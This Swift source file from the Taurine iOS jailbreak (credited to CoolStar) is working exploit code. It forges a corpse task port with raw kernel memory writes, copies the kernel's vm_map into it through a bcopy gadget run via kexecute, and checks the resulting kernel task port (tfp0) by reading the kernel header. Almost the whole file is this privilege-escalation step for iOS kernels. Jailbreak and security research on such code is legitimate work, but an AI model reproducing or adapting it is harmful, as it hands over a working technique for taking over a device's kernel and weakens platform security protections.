//
//  sethsp4.swift
//  Taurine
//
//  Created by CoolStar on 3/25/21.
//

import Foundation

class SetHSP4 {
    let offsets = Offsets.shared
    
    private let electra: Electra
    
    private func make_fake_task() -> mach_port_t {
        var corpse_task = mach_port_t()
        task_generate_corpse(mach_task_self_, &corpse_task)
        
        let corpse_task_port = electra.findPort(port: corpse_task)
        let fake_task = rk64ptr(corpse_task_port + offsets.ipc_port.ip_kobject)
        wk32(fake_task + offsets.task.ref_count, 99) //leak references
        
        wk32(fake_task + offsets.task.message_app_suspended, 1)
        wk32(fake_task + offsets.task.active, 1)
        
        wk64(corpse_task_port + offsets.ipc_port.io_references, 0xf00d)
        wk64(corpse_task_port + offsets.ipc_port.ip_srights, 0xf00d)
        
        wk64(fake_task + offsets.task.bsd_info, electra.kernel_proc) //PAC stops the wk64
        
        return corpse_task
    }
    
    init?(electra: Electra, kexecute: KExecute, slide: UInt64, vm_map_remap_gadget: UInt64, bcopy_gadget: UInt64) {
        guard !isArm64e() else {
            return nil
        }
        guard vm_map_remap_gadget != slide,
              bcopy_gadget != slide else {
            return nil
        }
        print(String(format: "vm_map_remap_gadget: 0x%llx", vm_map_remap_gadget))
        print(String(format: "bcopy_gadget: 0x%llx", bcopy_gadget))
        
        self.electra = electra
        
        let kernelTask = rk64ptr(electra.kernel_proc + offsets.proc.task)
        let kernelMap = rk64ptr(kernelTask + offsets.task.vm_map)
        
        let fakeTaskPort = make_fake_task()
        let fakeTaskPortAddr = electra.findPort(port: fakeTaskPort)
        let fakeTask = rk64ptr(fakeTaskPortAddr + offsets.ipc_port.ip_kobject)
        let fakeMap = rk64ptr(fakeTask + offsets.task.vm_map)
        
        /*let retVal = kexecute.kexecute(addr: vm_map_remap_gadget,
                          x0: kernel_map, x1: temp_buf,
                          x2: 0x8000, x3: 0,
                          x4: UInt64(VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR), x5: kernel_map,
                          x6: kernel_task)
        print(String(format: "remap: %s [0x%x]", mach_error_string(mach_error_t(retVal)), retVal))*/
        
        
        //bcopy -> src, dest, count
        kexecute.kexecute(addr: bcopy_gadget, x0: kernelMap, x1: fakeMap, x2: 0x120)
        
        for i in 0..<(0x120/8) {
            if rk64(kernelMap + UInt64(i * 8)) != rk64(fakeMap + UInt64(i * 8)){
                print(String(format: "mismatch at index: %x", i))
            }
        }
        
        let kernelBase = 0xFFFFFFF007004000 + slide
        //wk64(fakeTask + offsets.task.all_image_info_addr, kernelBase) //store kbase and slide
        //wk64(fakeTask + offsets.task.all_image_info_size, slide)
        
        var testHdr = UInt64(0)
        withUnsafeMutablePointer(to: &testHdr) {
            $0.withMemoryRebound(to: UInt8.self, capacity: MemoryLayout<UInt64>.size) {
                var outSz = mach_vm_size_t()
                mach_vm_read_overwrite(fakeTaskPort, kernelBase, 8, $0, &outSz)
            }
        }
        print(String(format: "Hdr from tfp0: 0x%llx", testHdr))
        print(String(format: "Hdr from kernrw: 0x%llx", rk64(kernelBase)))
    }
}
